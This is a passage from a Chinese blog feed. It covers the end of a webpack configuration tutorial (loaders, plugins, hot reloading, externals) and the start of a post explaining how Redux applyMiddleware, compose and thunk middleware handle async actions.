<p>即使这样配置，你可能还会遇到某些特性的使用依然报错，这时你就需要<a href="https://github.com/tc39/ecma262" target="_blank" rel="external">查阅</a>一下啦，可能这些特性仍然处于语法提案阶段，npm install相应的babel-preset-stage，在presets中添加即可。</p>
<h2 id="CSS加载"><a href="#CSS加载" class="headerlink" title="CSS加载"></a>CSS加载</h2><p>CSS也可以直接require在JS代码当中，在main.js中require(‘./app.css’)，在webpack中配置:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./main.js'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span></div><div class="line">  &#125;,</div><div class="line">   <span class="built_in">module</span>: &#123;</div><div class="line">    loaders:[</div><div class="line">      &#123; test: <span class="regexp">/\.css$/</span>, loader: <span class="string">'style-loader!css-loader'</span> &#125;,</div><div class="line">    ]</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>CSS需要先通过css-loader被读取，然后通过style-loader以内联的形式添加进入HTML页面。<code>!</code>来维持了前后顺序。当然要使用Less、Sass等预处理语言也是没有问题的，这些都可以被集成在webpack的配置当中。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>: &#123;</div><div class="line">   loaders: [</div><div class="line">     &#123; test: <span class="regexp">/\.scss$/</span>, loaders: [<span class="string">'style'</span>, <span class="string">'css'</span>, <span class="string">'sass'</span>] &#125;</div><div class="line">     <span class="comment">// &#123; test: /\.less$/, loaders: ['style', 'css', 'less'] &#125;</span></div><div class="line">   ]</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<h2 id="图片加载"><a href="#图片加载" class="headerlink" title="图片加载"></a>图片加载</h2><p>JS或是CSS中包含着图片，比如JS插入一个img，CSS中的background，意味着多一次http请求，webpack可以将小图片转化为Data URL。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./main.js'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span></div><div class="line">  &#125;,</div><div class="line">  <span class="built_in">module</span>: &#123;</div><div class="line">    loaders:[</div><div class="line">      <span class="comment">// 图片大小是要小于8192B的</span></div><div class="line">      &#123; test: <span class="regexp">/\.(png|jpg)$/</span>, loader: <span class="string">'url-loader?limit=8192'</span> &#125;</div><div class="line">    ]</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="webpack自身插件"><a href="#webpack自身插件" class="headerlink" title="webpack自身插件"></a>webpack自身插件</h2><p>在webpack中存在很多插件去扩展它的功能，其中有一个就是UglifyJs Plugin，主要是用于混淆和压缩。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</div><div class="line"><span class="keyword">var</span> uglifyJsPlugin = webpack.optimize.UglifyJsPlugin;</div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./main.js'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span></div><div class="line">  &#125;,</div><div class="line">  plugins: [</div><div class="line">    <span class="keyword">new</span> uglifyJsPlugin(&#123;</div><div class="line">      compress: &#123;</div><div class="line">        warnings: <span class="literal">false</span></div><div class="line">      &#125;</div><div class="line">    &#125;)</div><div class="line">  ]</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="webpack第三方插件"><a href="#webpack第三方插件" class="headerlink" title="webpack第三方插件"></a>webpack第三方插件</h2><p>你也可以使用很多webpack的第三方插件，比如<code>html-webpack-plugin</code>会为你创建一个index.html，<code>open-browser-webpack-plugin</code>会为你自动打开地址。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> HtmlwebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>);</div><div class="line"><span class="keyword">var</span> OpenBrowserPlugin = <span class="built_in">require</span>(<span class="string">'open-browser-webpack-plugin'</span>);</div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./main.js'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span></div><div class="line">  &#125;,</div><div class="line">  plugins: [</div><div class="line">    <span class="keyword">new</span> HtmlwebpackPlugin(&#123;</div><div class="line">      title: <span class="string">'Webpack-demos'</span></div><div class="line">    &#125;),</div><div class="line">    <span class="keyword">new</span> OpenBrowserPlugin(&#123;</div><div class="line">      url: <span class="string">'http://localhost:8080'</span></div><div class="line">    &#125;)</div><div class="line">  ]</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="环境标记"><a href="#环境标记" class="headerlink" title="环境标记"></a>环境标记</h2><p>通过环境标志可以区分生产环境与开发环境，如果只想在开发环境中执行某些操作，可以在执行这些操作前判断<code>__DEV__</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</div><div class="line"><span class="keyword">var</span> devFlagPlugin = <span class="keyword">new</span> webpack.DefinePlugin(&#123;</div><div class="line">  __DEV__: <span class="built_in">JSON</span>.stringify(<span class="built_in">JSON</span>.parse(process.env.DEBUG || <span class="string">'false'</span>))</div><div class="line">&#125;);</div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./main.js'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span></div><div class="line">  &#125;,</div><div class="line">  plugins: [devFlagPlugin]</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>相应OS对应的命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Linux &amp; Mac</span></div><div class="line">$ env DEBUG=<span class="literal">true</span> webpack-dev-server</div><div class="line"><span class="comment"># Windows</span></div><div class="line">$ DEBUG=<span class="literal">true</span> webpack-dev-server</div></pre></td></tr></table></figure>
<h2 id="模块化js"><a href="#模块化js" class="headerlink" title="模块化js"></a>模块化js</h2><p>对于大型js应用来说，必定需要采用模块化。webpack很好地支持js模块化（require，支持ES6可使用import），并会将各个js汇总打包成一个bundle.js。</p>
<p>多个js文件可能会共用一些js模块，webpack可以使用<code>CommonsChunkPlugin</code>自动提取</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// main1.jsx</span></div><div class="line"><span class="keyword">var</span> React = <span class="built_in">require</span>(<span class="string">'react'</span>);</div><div class="line"><span class="keyword">var</span> ReactDOM = <span class="built_in">require</span>(<span class="string">'react-dom'</span>);</div><div class="line">ReactDOM.render(</div><div class="line">  <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>,</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'a'</span>)</div><div class="line">);</div><div class="line"><span class="comment">// main2.jsx</span></div><div class="line"><span class="keyword">var</span> React = <span class="built_in">require</span>(<span class="string">'react'</span>);</div><div class="line"><span class="keyword">var</span> ReactDOM = <span class="built_in">require</span>(<span class="string">'react-dom'</span>);</div><div class="line">ReactDOM.render(</div><div class="line">  <span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello Webpack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span>,</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'b'</span>)</div><div class="line">);</div></pre></td></tr></table></figure>
<p>main1.jsx与main2.jsx共用react与react-dom，共用模块会生成init.js，main1.jsx生成bundle1.js，main2.jsx生成bundle2.js</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">var CommonsChunkPlugin = require(&quot;webpack/lib/optimize/CommonsChunkPlugin&quot;);</div><div class="line">module.exports = &#123;</div><div class="line">  entry: &#123;</div><div class="line">    bundle1: &apos;./main1.jsx&apos;,</div><div class="line">    bundle2: &apos;./main2.jsx&apos;</div><div class="line">  &#125;,</div><div class="line">  output: &#123;</div><div class="line">    filename: &apos;[name].js&apos;</div><div class="line">  &#125;,</div><div class="line">  module: &#123;</div><div class="line">    loaders:[</div><div class="line">      &#123;</div><div class="line">        test: /\.js[x]?$/,</div><div class="line">        exclude: /node_modules/,</div><div class="line">        loader: &apos;babel-loader&apos;,</div><div class="line">        query: &#123;</div><div class="line">          presets: [&apos;es2015&apos;, &apos;react&apos;]</div><div class="line">        &#125;</div><div class="line">      &#125;,</div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  plugins: [</div><div class="line">    new CommonsChunkPlugin(&apos;init.js&apos;)</div><div class="line">  ]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>对于一些常用的第三方js库，比如jquery，我们不必把它合并到自己的js当中，也可以将其设置为全局变量，不必再require</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: &#123;</div><div class="line">    app: <span class="string">'./main.js'</span>,</div><div class="line">    vendor: [<span class="string">'jquery'</span>],</div><div class="line">  &#125;,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span></div><div class="line">  &#125;,</div><div class="line">  plugins: [</div><div class="line">    <span class="comment">// 全局预先require('jquery')</span></div><div class="line">    <span class="keyword">new</span> webpack.ProvidePlugin(&#123;</div><div class="line">      $: <span class="string">"jquery"</span>,</div><div class="line">      jQuery: <span class="string">"jquery"</span>,</div><div class="line">      <span class="string">"window.jQuery"</span>: <span class="string">"jquery"</span></div><div class="line">    &#125;),</div><div class="line">    <span class="comment">// 与上一种共用模块集成有相似之处</span></div><div class="line">    <span class="keyword">new</span> webpack.optimize.CommonsChunkPlugin(<span class="comment">/* chunkName= */</span><span class="string">'vendor'</span>, <span class="comment">/* filename= */</span><span class="string">'vendor.js'</span>)</div><div class="line">  ]</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>也可以添加一些自定义的js，如果你不想包含在webpack的bundle中。通过webpack后，直接require。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./main.jsx'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span></div><div class="line">  &#125;,</div><div class="line">  <span class="built_in">module</span>: &#123;</div><div class="line">    loaders:[</div><div class="line">      &#123;</div><div class="line">        test: <span class="regexp">/\.js[x]?$/</span>,</div><div class="line">        exclude: <span class="regexp">/node_modules/</span>,</div><div class="line">        loader: <span class="string">'babel-loader'</span>,</div><div class="line">        query: &#123;</div><div class="line">          presets: [<span class="string">'es2015'</span>, <span class="string">'react'</span>]</div><div class="line">        &#125;</div><div class="line">      &#125;,</div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  externals: &#123;</div><div class="line">    <span class="comment">// 可以直接在main.jsx中require('data')</span></div><div class="line">    <span class="string">'data'</span>: <span class="string">'data'</span></div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="webpack热加载"><a href="#webpack热加载" class="headerlink" title="webpack热加载"></a>webpack热加载</h2><p>webpack热加载在开发环境下，无需刷新，即可看到当前代码改动效果，目前共有两种方法:</p>
<p>(1) 使用命令行模式<code>$ webpack-dev-server --hot --inline</code></p>
<p><code>--hot</code>与<code>--inline</code>相当于添加了<code>HotModuleReplacementPlugin</code>切换到服务器热加载模式，添加<code>webpack/hot/dev-server</code>入口，在<code>bundle</code>中运行<code>webpack-dev-server</code></p>
<p>(2) 配置<code>webpack.config.js</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</div><div class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: [</div><div class="line">    <span class="string">'webpack/hot/dev-server'</span>,</div><div class="line">    <span class="string">'webpack-dev-server/client?http://localhost:8080'</span>,</div><div class="line">    <span class="string">'./index.js'</span></div><div class="line">  ],</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span>,</div><div class="line">    publicPath: <span class="string">'/static/'</span></div><div class="line">  &#125;,</div><div class="line">  plugins: [</div><div class="line">    <span class="keyword">new</span> webpack.HotModuleReplacementPlugin()</div><div class="line">  ],</div><div class="line">  <span class="built_in">module</span>: &#123;</div><div class="line">    loaders: [&#123;</div><div class="line">      test: <span class="regexp">/\.jsx?$/</span>,</div><div class="line">      exclude: <span class="regexp">/node_modules/</span>,</div><div class="line">      loaders: [<span class="string">'babel-loader'</span>],</div><div class="line">      query: &#123;</div><div class="line">        presets: [<span class="string">'es2015'</span>, <span class="string">'react'</span>]</div><div class="line">      &#125;,</div><div class="line">      include: path.join(__dirname, <span class="string">'.'</span>)</div><div class="line">    &#125;]</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="省略文件扩展名"><a href="#省略文件扩展名" class="headerlink" title="省略文件扩展名"></a>省略文件扩展名</h2><p>在require时可省略文件扩展名，只需要在webpack.config.js中添加<code>resolve.extensions</code>来配置</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// webpack.config.js</span></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">  entry: <span class="string">'./main.js'</span>,</div><div class="line">  output: &#123;</div><div class="line">    filename: <span class="string">'bundle.js'</span></div><div class="line">  &#125;,</div><div class="line">  <span class="built_in">module</span>: &#123;</div><div class="line">    loaders: [</div><div class="line">      &#123; test: <span class="regexp">/\.coffee$/</span>, loader: <span class="string">'coffee-loader'</span> &#125;,</div><div class="line">      &#123;</div><div class="line">        test: <span class="regexp">/\.js$/</span>,</div><div class="line">        loader: <span class="string">'babel-loader'</span>,</div><div class="line">        query: &#123;</div><div class="line">          presets: [<span class="string">'es2015'</span>, <span class="string">'react'</span>]</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    ]</div><div class="line">  &#125;,</div><div class="line">  resolve: &#123;</div><div class="line">    <span class="comment">// 现在你require文件的时候可以直接使用require('file')，不用使用require('file.coffee')</span></div><div class="line">   extensions: [<span class="string">''</span>, <span class="string">'.js'</span>, <span class="string">'.json'</span>, <span class="string">'.coffee'</span>]</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="Express与webpack"><a href="#Express与webpack" class="headerlink" title="Express与webpack"></a>Express与webpack</h2><p>在Express中主要是添加<code>webpack-dev-middleware</code>和<code>webpack-hot-middleware</code>两个中间件。</p>
<p><code>webpack-dev-middleware</code>与上文<code>webpack-dev-server</code>类似，用于处理静态资源。</p>
<p><code>webpack-hot-middleware</code>就是HMR(Hot Module Replacement)，用于无刷新更新。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://webpack.github.io/docs/" target="_blank" rel="external">THE WEBPACK DOCUMENTATION</a></p>
<p><a href="https://github.com/petehunt/webpack-howto/blob/master/README-zh.md" target="_blank" rel="external">webpack - howto</a></p>
<p><a href="https://github.com/ruanyf/webpack-demos" target="_blank" rel="external">webpack - demos</a></p>
<p><a href="http://liyaodong.com/2016/04/15/webpack-the-confusing-parts" target="_blank" rel="external">Webpack 一探究竟</a></p>
<p><a href="https://segmentfault.com/a/1190000002551952" target="_blank" rel="external">Webpack 入门指迷</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要根据阮一峰老师的&lt;a href=&quot;https://github.com/ruanyf/webpack-demos&quot;&gt;webpack-demos&lt;/a&gt;进行一些提炼。Webpack作为目前作为火热的前端构建工具，redux的官方示例中也使用到了&lt;code&gt;webpack-dev-middleware&lt;/code&gt;、&lt;code&gt;webpack-hot-middleware&lt;/code&gt;等，便想再次总结学习一下。&lt;/p&gt;
&lt;h2 id=&quot;入口与出口文件&quot;&gt;&lt;a href=&quot;#入口与出口文件&quot; class=&quot;headerlink&quot; title=&quot;入口与出口文件&quot;&gt;&lt;/a&gt;入口与出口文件&lt;/h2&gt;&lt;p&gt;entry为入口文件，output为出口文件，通过webpack的处理，当前目录下的main.js会转变为bundle.js。&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// webpack.config.js&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;module&lt;/span&gt;.exports = &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  entry: &lt;span class=&quot;string&quot;&gt;&#39;./main.js&#39;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  output: &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    filename: &lt;span class=&quot;string&quot;&gt;&#39;bundle.js&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="前端工程化" scheme="http://blackganglion.com/categories/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96/"/>
    
    
      <category term="Webpack" scheme="http://blackganglion.com/tags/Webpack/"/>
    
  </entry>
  
  <entry>
    <title>Redux异步Action与Middleware</title>
    <link href="http://blackganglion.com/2016/04/19/Redux%E5%BC%82%E6%AD%A5Action%E4%B8%8EMiddleware/"/>
    <id>http://blackganglion.com/2016/04/19/Redux异步Action与Middleware/</id>
    <published>2016-04-19T14:06:00.000Z</published>
    <updated>2016-07-08T14:48:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要对于<a href="http://camsong.github.io/redux-in-chinese/index.html" target="_blank" rel="external">redux官方文档</a>中的<a href="https://github.com/reactjs/redux/tree/master/examples/async" target="_blank" rel="external">async</a>示例结合一些源码做出一些理解。</p>
<p>此示例通过<code>&lt;select&gt;</code>选择相应的value(reactjs与frontend)作为selectedReddit，向Reddit API请求相应的json数据，获取数据后渲染到列表中。主要采用了<a href="https://github.com/gaearon/redux-thunk" target="_blank" rel="external">react-thunk</a>作为middleware来实现。</p>
<p>首先，再来看一下<code>createStore</code>的定义，第三个参数<code>applyMiddleware</code>相应的中间件，这里<code>thunkMiddleware</code>主要是用来异步控制的，后面会再次讲解</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// createStore(reducer, initialState, enhancer)</span></div><div class="line"><span class="keyword">const</span> store = createStore(</div><div class="line">    rootReducer,</div><div class="line">    initialState,</div><div class="line">    applyMiddleware(thunkMiddleware, createLogger())</div><div class="line">)</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>我们来看一下<code>createStore</code>的源码，是如何处理middleware的，省去了一些无用的代码，即<code>applyMiddleware(createStore)(reducer, initialState)</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">createStore</span>(<span class="params">reducer, initialState, enhancer</span>) </span>&#123;</div><div class="line">  ...</div><div class="line">  if (<span class="keyword">typeof</span> enhancer !== <span class="string">'undefined'</span>) &#123;</div><div class="line">    ...</div><div class="line">    return enhancer(createStore)(reducer, initialState)</div><div class="line">  &#125;</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>再看一眼<code>applyMiddleware</code>的代码，如果对<code>=&gt;</code>有些茫然，可以先查阅ES6中箭头函数的用法。传入<code>createStore</code>构建store，此时因为无参数输入，enhancer为undefined。对所有middleware进行遍历，注入middlewareAPI，返回chain，即[f1(next), f2(next), f3(next), …]，用<code>compose</code>处理chain，主要目的是将middleware组合串联，f1(f2(f3(store.dispatch)))。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">applyMiddleware</span>(<span class="params">...middlewares</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> (createStore) =&gt; (reducer, initialState, enhancer) =&gt; &#123;</div><div class="line">    <span class="comment">// enhancer == undefined</span></div><div class="line">    <span class="keyword">var</span> store = createStore(reducer, initialState, enhancer)</div><div class="line">    <span class="keyword">var</span> dispatch = store.dispatch</div><div class="line">    <span class="keyword">var</span> chain = []</div><div class="line">    <span class="keyword">var</span> middlewareAPI = &#123;</div><div class="line">      getState: store.getState,</div><div class="line">      dispatch: (action) =&gt; dispatch(action)</div><div class="line">    &#125;</div><div class="line">    chain = middlewares.map(middleware =&gt; middleware(middlewareAPI))</div><div class="line">    dispatch = compose(...chain)(store.dispatch)</div><div class="line">    <span class="comment">// 结合compose的实现, 实际为 next1(next2(next3(store.dispatch)))(action)</span></div><div class="line">    <span class="keyword">return</span> &#123;</div><div class="line">      ...store,</div><div class="line">      dispatch</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>compose</code>的实现主要是这样的:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">compose</span>(<span class="params">...funcs</span>) </span>&#123;</div><div class="line">  <span class="comment">// ...args为store.dispatch</span></div><div class="line">  <span class="keyword">return</span> (...args) =&gt; &#123;</div><div class="line">    <span class="keyword">if</span> (funcs.length === <span class="number">0</span>) <span class="keyword">return</span> args[<span class="number">0</span>];</div><div class="line">    <span class="comment">// 取funcs中最后一个元素</span></div><div class="line">    <span class="keyword">const</span> last = funcs[funcs.length - <span class="number">1</span>]</div><div class="line">    <span class="comment">// funcs除去最后一个元素</span></div><div class="line">    <span class="keyword">const</span> rest = funcs.slice(<span class="number">0</span>, <span class="number">-1</span>)</div><div class="line">    <span class="comment">// last(..args) 为 initialValue，composed为先前值，next为store.dispatch</span></div><div class="line">    <span class="keyword">return</span> rest.reduceRight((composed, f) =&gt; f(composed), last(...args))</div><div class="line">    <span class="comment">// return next1(next2(next3(store.dispatch)))</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>而对于<code>thunkMiddleware</code>而言，传入参数{dispatch, getState}即为middlewareAPI，这里使用到了闭包，对于f1(f2(f3(store.dispatch)))而言，它的next为f2(f3(store.dispatch))，传入相应action后，会进行一个判断，若action为function则action(dispatch, getState)，不然会利用next传给下一个middleware。</p>
<p>注意: 这里判断action是否为function的主要原因是部分action不需要到达store.dispatch，thunkMiddleware会对其进行拦截</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">thunkMiddleware</span>(<span class="params">&#123; dispatch, getState &#125;</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> next =&gt; action =&gt;</div><div class="line">    <span class="keyword">typeof</span> action === <span class="string">'function'</span> ?</div><div class="line">      action(dispatch, getState) :</div><div class="line">      next(action);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>让我们再回到示例的核心代码部分，这里尽量用少的代码来表达我的理解，具体的代码可自行研读。</p>
<p>(1) 当<code>&lt;select&gt;</code>从reactjs切换到frontend时，触发onChange，<code>dispatch(selectReddit(nextReddit))</code>，新的state形成，其中selectedReddit值变为frontend。</p>
